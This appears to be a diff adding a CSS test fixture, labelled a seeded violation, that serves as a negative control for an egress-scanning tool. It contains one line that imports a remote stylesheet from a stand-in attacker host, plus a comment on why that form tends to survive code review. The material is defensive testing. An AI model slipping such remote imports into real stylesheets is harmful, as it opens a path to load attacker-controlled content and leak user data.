@@ -1,0 +1,12 @@
+/*
+  SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
+  Expected sink: css-import. @import is remote *code* load for the styling
+  engine — the imported sheet can itself contain url() references, so one line
+  here reopens the whole surface. It is also the form most likely to survive
+  review, since it looks like a build-time include rather than a request.
+*/
+@import url("https://evil.invalid/x.css");
+
+.vg-findings {
+  color: inherit;
+}
